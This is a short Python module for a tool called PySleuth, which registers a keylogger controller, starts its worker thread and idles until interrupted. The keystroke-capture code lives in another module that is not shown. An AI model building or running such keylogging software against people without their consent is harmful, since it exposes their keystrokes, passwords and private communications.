from .controllers.keylogger_controller import KeyLoggerController


class PySleuth:
    def __init__(self):
        self.controllers = set()

        self._initControllers()

    def start(self):
        for controller in self.controllers:
            controller.startWorker()

    def mainLoop(self):
        try:
            while True:
                pass
        except KeyboardInterrupt:
            print("\nUser abort!")

    def _initControllers(self):
        self.controllers.add(KeyLoggerController())
